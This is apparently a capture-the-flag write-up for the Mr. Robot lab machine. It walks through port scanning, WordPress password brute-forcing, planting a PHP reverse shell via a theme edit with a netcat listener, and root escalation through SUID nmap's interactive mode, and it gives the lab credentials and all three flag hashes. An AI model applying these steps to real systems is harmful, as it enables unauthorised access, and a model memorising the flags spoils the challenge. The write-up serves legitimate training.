markdown
# Mr. Robot CTF Walkthrough - VulnHub/TryHackMe

## Introduction
The Mr. Robot CTF, inspired by the *Mr. Robot* TV show, is a beginner-to-intermediate Linux-based virtual machine available on [VulnHub](https://www.vulnhub.com/entry/mr-robot-1,151/) and [TryHackMe](https://tryhackme.com/room/mrrobot). The goal is to find three hidden keys (flags) through web enumeration, brute-forcing, and privilege escalation. This write-up documents my approach to solving the challenge.

## Challenge Description
The VM hosts a web server on ports 80 (HTTP) and 443 (HTTPS) with a *Mr. Robot*-themed interface. The challenge provides files like `robots.txt` and `fsocity.dic` to aid in finding the three flags. Tasks involve enumerating a web server, brute-forcing a WordPress login, and escalating privileges to root.

## Solution/Steps

### Key 1: Web Enumeration
1. **Scan the Network**: Identified the target IP using Netdiscover:
   bash
   netdiscover
   
   Target IP: `10.0.2.7` .
2. **Port Scanning**: Used Nmap to find open ports:
   bash
   nmap -T4 -A -p- 10.0.2.7
   <img width="803" height="557" alt="r1" src="https://github.com/user-attachments/assets/2f84ef42-19fb-47f8-af74-985c8a28cc2b" />

   
   Result: Ports 80 (HTTP) and 443 (HTTPS) open.
4. **Check robots.txt**: Visited `http://10.10.58.206/robots.txt` and found `key-1-of-3.txt` and `fsocity.dic`. Downloaded the first key:
   bash
   wget http://10.0.2.7/key-1-of-3.txt
<img width="416" height="34" alt="r6" src="https://github.com/user-attachments/assets/1fc0dc9d-5d40-4608-9362-02f696b3717d" />

   **Flag 1**: `073403c8a58a1f80d943455fb30724b9`
<img width="354" height="55" alt="r8" src="https://github.com/user-attachments/assets/c3d200c3-f4e9-4ac6-9133-fd3b1f378a68" />

### Key 2: WordPress Login
1. **Directory Brute-Forcing**: Used GoBuster to find hidden directories:
   bash
   gobuster dir -u http://10.0.2.7 -w /usr/share/wordlists/dirb/common.txt
   <img width="872" height="551" alt="r2a" src="https://github.com/user-attachments/assets/9235ff5f-19a4-48f8-ba0f-4418e66222e2" />
<img width="705" height="547" alt="r2b" src="https://github.com/user-attachments/assets/9a8e00fa-a10c-471a-bd43-e54c57831f63" />

   Discovered `/wp-login.php`.
2. **Brute-Force WordPress**: Used wpscan with `fsocity.dic` to crack the login
   <img width="732" height="553" alt="r15" src="https://github.com/user-attachments/assets/fa41ecb6-8e63-43de-b339-b14bc2c25195" />
<img width="619" height="381" alt="r17" src="https://github.com/user-attachments/assets/53787ca4-020c-4e68-97a6-3483bb4cd065" />

   Credentials: `elliot:ER28-0652`.
3. **Gain Shell Access**: Logged into WordPress, edited `comments.php` to upload a PHP reverse shell. Set up a Netcat listener:
   bash
   nc -nlvp 1234
   <img width="917" height="261" alt="r54" src="https://github.com/user-attachments/assets/9d9d4b25-6ffc-437b-b6aa-100fd364b564" />

   Navigated to `/home/robot` and found the second key:
   bash
   cat key-2-of-3.txt
   <img width="436" height="125" alt="r58" src="https://github.com/user-attachments/assets/a406cc8d-6961-42d2-b2aa-9c351edb692e" />

   **Flag 2**: `822c73956184f694993bede3eb39f959`

### Key 3: Privilege Escalation
1. **Check SUID Binaries**: Found exploitable Nmap binary:
   bash
   find / -perm -u=s 2>/dev/null
   <img width="557" height="303" alt="r60" src="https://github.com/user-attachments/assets/5839cc3a-7c81-4233-9301-eb0dd6d54bfe" />

   Nmap version 2.02–5.21 supports interactive mode.
2. **Exploit Nmap**: Used Nmap to gain root shell:
   bash
   nmap --interactive
   nmap> !sh
   <img width="528" height="161" alt="r61" src="https://github.com/user-attachments/assets/0f6347ad-49e7-4bf5-b5c9-90838e2c2f73" />

3. **Retrieve Final Flag**: Navigated to `/root`:
   bash
   cd /root
   cat key-3-of-3.txt
   <img width="380" height="125" alt="r62" src="https://github.com/user-attachments/assets/9a84d3d7-4a28-42b1-b678-9333424f5636" />

   **Flag 3**: `04787ddef27c3dee1ee161b21670b4e4`

## Tools and Techniques
- **Nmap**: Port scanning and privilege escalation.
- **GoBuster**: Directory brute-forcing.
- **wpscan**: WordPress credential brute-forcing.
- **wget**: File downloads.
- **Netcat**: Reverse shell handling.
- **PHP Reverse Shell**: Gained user access.


## Flags
plaintext
- Key 1: 073403c8a58a1f80d943455fb30724b9
- Key 2: 822c73956184f694993bede3eb39f959
- Key 3: 04787ddef27c3dee1ee161b21670b4e4


## Conclusion
This CTF taught me the importance of enumeration and exploiting SUID binaries. The *Mr. Robot* theme made it engaging, and I improved my skills with Nmap and wpscan.
## References
- [VulnHub: Mr. Robot CTF](https://www.vulnhub.com/entry/mr-robot-1,151/)
- [TryHackMe: Mr. Robot CTF](https://tryhackme.com/room/mrrobot)
- [GTFObins: Nmap](https://gtfobins.github.io/gtfobins/nmap/)
- [SecLists Wordlists](https://github.com/danielmiessler/SecLists)
- [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
  
